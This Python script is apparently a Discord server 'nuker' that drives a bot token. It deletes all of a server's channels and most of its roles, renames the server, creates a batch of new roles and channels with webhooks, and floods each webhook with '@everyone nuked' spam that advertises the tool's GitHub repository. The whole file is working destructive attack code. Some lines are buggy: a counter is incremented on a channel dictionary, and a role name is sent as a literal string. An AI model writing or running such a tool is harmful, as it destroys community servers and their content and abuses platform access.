import sys
sys.dont_write_bytecode = True
import asyncio
import aiohttp

print("This will only work with bot tokens")
with open("token.txt", "r") as file:
    token = file.readline().strip()

guild_id = input("Guild ID? ")
themessage = input("What should the message be?[click enter for default] ")
if themessage == "":
    themessage = "@everyone nuked by netcry download at https://github.com/dropalways/netcry-nuker"
sname = input("What should the new server name be?[click enter for default] ")
if sname == "":
    sname = "Netcry on top"

num_channels = 15
num_messages = 75
num_roles = 50

async def start_bot():
    headers = {'Authorization': f'Bot {token}'}
    async with aiohttp.ClientSession(headers=headers) as session:
        await delete_all_roles(session)
        await create_roles(session)
        guild_url = f'https://discord.com/api/v9/guilds/{guild_id}'
        async with session.get(guild_url) as guild_response:
            if guild_response.status == 200:
                await delete_all_channels(session)
                await change_server_name(session, sname)
                channels_created = await create_channels_with_webhooks(session)
                if channels_created:
                    await send_messages(channels_created, num_messages, session)
            else:
                print("Invalid guild ID")

async def delete_all_channels(session):
    print("Deleting channels...")
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    async with session.get(url) as response:
        if response.status == 200:
            channels = await response.json()
            delete_tasks = []
            for channel in channels:
                channel_id = channel['id']
                delete_url = f'https://discord.com/api/v9/channels/{channel_id}'
                delete_tasks.append(session.delete(delete_url))
                channel.delete_count += 1

            await asyncio.gather(*delete_tasks)
            
            print(f"Deleted all channels.")
        else:
            print("Failed to retrieve channels")

async def delete_all_roles(session):
    print("Deleting roles...")
    roles_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    async with session.get(roles_url) as response:
        if response.status == 200:
            roles = await response.json()
            delete_tasks = []
            delete_count = 0
            for role in roles:
                role_id = role['id']
                if role_id != guild_id and delete_count < len(roles) - num_roles:
                    delete_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}'
                    delete_tasks.append(session.delete(delete_url))
                    delete_count += 1

            await asyncio.gather(*delete_tasks)

            print(f"Deleted {delete_count} roles")
        else:
            print("Failed to retrieve roles")

async def create_roles(session):
    print("Creating roles...")
    rname = "Net cry on top"
    create_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    create_role_payload = {
        'name': 'rname',
        'color': 0xFF0000,
        'hoist': True,
        'mentionable': True
    }
    create_tasks = []
    for _ in range(num_roles):
        create_tasks.append(session.post(create_role_url, json=create_role_payload))

    create_responses = await asyncio.gather(*create_tasks)

    created_roles = sum([1 for response in create_responses if response.status == 200])
    print(f"Created roles: {created_roles}/{num_roles}")

async def create_channels_with_webhooks(session):
    print("Creating channels and webhooks...")
    channels_created = []
    headers = {
        'Content-Type': 'application/json'
    }
    create_tasks = []
    create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    for _ in range(num_channels):
        create_channel_payload = {
            'name': 'netcry-on-top',
            'type': 0
        }
        create_tasks.append(session.post(create_channel_url, headers=headers, json=create_channel_payload))
    create_responses = await asyncio.gather(*create_tasks)

    for create_response in create_responses:
        if create_response.status == 201:
            channel = await create_response.json()
            channel_id = channel['id']
            Wname = "https://github.com/dropalways/netcry-nuker"
            create_webhook_url = f'https://discord.com/api/v9/channels/{channel_id}/webhooks'
            create_webhook_payload = {
                'name': f'{Wname}',
            }
            create_webhook_response = await session.post(create_webhook_url, headers=headers, json=create_webhook_payload)
            if create_webhook_response.status == 200:
                webhook = await create_webhook_response.json()
                webhook_url = webhook['url']
                channels_created.append({
                    'channel_id': channel_id,
                    'webhook_url': webhook_url
                })
                print(f"Created Webhook: {webhook_url}")
            else:
                print(f"Failed to create webhook for channel: {channel_id}")
        else:
            print("Failed to create channel")

    return channels_created

async def send_message(webhook_url, session):
    message = {
        "content": themessage,
        "avatar_url": "https://cdn.discordapp.com/attachments/1126518423854260246/1128843072034308156/discord-avatar-512-Z9FGP.png",
        "components": [
            {
                "type": 1,
                "components": [
                    {
                        "type": 2,
                        "style": 5,
                        "label": "Download the nuker",
                        "url": "https://github.com/dropalways/netcry-nuker"
                    }
                ]
            }
        ]
    }
    retry_delay = 1

    while True:
        try:
            async with session.post(webhook_url, json=message) as response:
                if response.status == 204:
                    print(f"Message sent to webhook: {webhook_url}")
                    return True
                else:
                    print(f"Failed to send message to webhook: {webhook_url}")
        except aiohttp.ClientError as e:
            print(f"Error sending message to webhook: {webhook_url}\n{e}")

        print(f"Retrying message to webhook: {webhook_url}")
        await asyncio.sleep(retry_delay)

async def send_messages(channels_created, num_messages, session):
    print("Sending messages...")
    send_tasks = []

    for _ in range(num_messages):
        for channel in channels_created:
            send_tasks.append(asyncio.ensure_future(send_message(channel['webhook_url'], session)))
            await asyncio.sleep(0.1)

    await asyncio.gather(*send_tasks)

async def change_server_name(session, sname):
    print("Changing server name...")
    url = f'https://discord.com/api/v9/guilds/{guild_id}'
    headers = {
        'Content-Type': 'application/json'
    }
    payload = {
        'name': sname
    }

    async with session.patch(url, headers=headers, json=payload) as response:
        if response.status == 200:
            print(f"Server name changed to: {sname}")
        else:
            print("Failed to change server name")

async def start_bot_thread():
    await start_bot()

asyncio.run(start_bot_thread())
